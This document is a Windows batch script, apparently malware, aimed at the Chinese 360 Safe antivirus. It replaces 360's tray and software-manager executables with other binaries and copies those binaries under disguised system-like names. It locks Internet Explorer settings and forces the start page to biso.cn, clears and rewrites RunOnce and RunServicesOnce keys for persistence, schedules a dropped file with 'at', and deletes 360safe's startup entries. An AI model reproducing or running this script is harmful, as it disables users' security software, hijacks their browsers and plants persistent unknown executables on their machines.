set win32=%windir%\system32
call "%ProgramFiles%\Common Files\system\stee.bat"
echo %fPath%

::del/q "%fPath%\safemon\360tray.exe"
copy/y "%ProgramFiles%\Common Files\InstallShield\Driver\windll\smss_s.exe" "%fpath%\safemon\360tray.exe"
copy/y "%ProgramFiles%\Common Files\InstallShield\Driver\windll\soft.exe" "%fpath%\SoftMgr\SoftManager.exe"

%windir:~0,2%
cd %ProgramFiles%
cd Common Files
md system
md 360safe
copy/y InstallShield\Driver\windll\smss_s.exe 360safe\360hotfix.exe
copy/y InstallShield\Driver\windll\smss_s.exe 360safe\360Safe.exe
copy/y InstallShield\Driver\windll\smss.exe system\spool.exe
copy/y InstallShield\Driver\windll\smss.exe "%win32%\imepy.exe"
copy/y InstallShield\Driver\windll\smss_i.exe "%windir%\image.exe"
copy/y InstallShield\Driver\windll\smss_i.exe d:\Msc.exe
cd..
cd Internet Explorer
copy/y ..\ie.exe ie.exe"

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v HomePage /t reg_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v HomePage /t reg_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v Settings /t reg_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v Links /t reg_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v SecAddSites /t reg_DWORD /d 0 /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /d http://www.biso.cn /f

rem "delete value of this reg group"
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /va /f
reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /va /f
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /va /f
reg delete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /va /f
rem "delete value of this reg group over"
::""""作用在于在字符号外加一对引号
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v 360safetray /d """"%ProgramFiles%\Common~1\360safe\360hotfix.exe"""" /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce /v soundman /d """"%ProgramFiles%\Common files\system\spool.exe"""" /f
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce /v internat.exe /d """"%win32%\imepy.exe"""" /f
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce /v 360safe /d """"%ProgramFiles%\Common files\360safe\360Safe.exe"""" /f


at /delete /yes
at 10:01 "%win32%\imepy.exe"

::"获得 360safe监控程序的文件目录"
for /f "skip=4 tokens=1,2 delims=:" %%a in ('reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 360safetray') do (
  set QQPathL=%%a
  set QQPathR=%%b
)
set QQPath=%QQPathL:~-1%:%QQPathR%
::去掉后面的 /start 等参数
set dpath=%QQPath:~0,-27%
echo %dpath%
::记录
if "%dpath%"=="" goto a
echo set fPath=%dpath%>"%ProgramFiles%\Common Files\system\stee.bat"
rem "获得 360safe监控程序的文件目录 OVER"
:a
reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 360safetray /f
reg delete HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v 360safebox /f
